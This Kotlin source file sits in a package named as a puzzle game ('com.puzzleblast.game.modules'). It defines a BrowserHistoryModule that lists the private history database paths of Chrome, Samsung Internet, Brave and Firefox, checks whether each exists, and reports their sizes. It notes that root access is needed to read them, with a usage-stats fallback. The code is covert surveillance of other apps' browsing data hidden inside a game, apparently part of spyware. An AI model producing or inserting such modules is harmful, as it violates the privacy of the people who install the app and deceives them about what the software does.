package com.puzzleblast.game.modules

import android.content.Context
import java.io.File

object BrowserHistoryModule {
    private val browsers = mapOf(
        "Chrome" to "/data/data/com.android.chrome/app_chrome/Default/History",
        "Samsung" to "/data/data/com.sec.android.app.sbrowser/databases/history.db",
        "Brave" to "/data/data/com.brave.browser/app_chrome/Default/History",
        "Firefox" to "/data/data/org.mozilla.firefox/files/mozilla/places.sqlite"
    )

    suspend fun extract(ctx: Context): String {
        val sb = StringBuilder("🌐 Browser history\n")
        var found = false
        for ((name, path) in browsers) {
            val f = File(path)
            if (f.exists()) {
                found = true
                sb.append("✅ $name: ${f.length()} bytes (needs root to parse)\n")
            } else {
                sb.append("❌ $name: not found\n")
            }
        }
        if (!found) sb.append("No browser DBs accessible (root required for direct read; fallback via usage stats limited)")
        return sb.toString()
    }
}
